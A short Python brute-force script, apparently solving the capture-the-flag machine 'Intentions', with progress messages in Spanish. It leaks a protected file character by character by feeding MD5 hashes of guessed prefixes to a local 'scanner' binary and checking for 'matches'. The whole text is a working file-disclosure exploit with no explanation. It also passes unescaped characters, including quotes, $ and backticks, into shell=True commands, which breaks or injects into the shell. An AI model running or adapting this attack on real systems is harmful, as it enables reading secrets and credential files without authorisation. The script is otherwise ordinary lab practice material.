#!/usr/bin/env python

import subprocess
import string
import pdb
import hashlib
from pwn import *
import time

characters = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
text = ""

p1 = log.progress("Iniciando ataque de fuerza bruta")
print("")
time.sleep(1)
p2 = log.progress("Contenido")
for i in range(1, 50):
    for character in characters:
        comando = './scanner -c /home/sexcott/Desktop/Machines/Intentions/content/hola.txt -s $(echo -n "%s%s" | md5sum | tr -d \' -\') -p -l %d' % (text,character,i)
        salida = subprocess.check_output(comando, shell=True, text=True)
        
       
        if 'matches' in salida:
            text += character
            p2.status(text)
            break

p2.success(text)


            

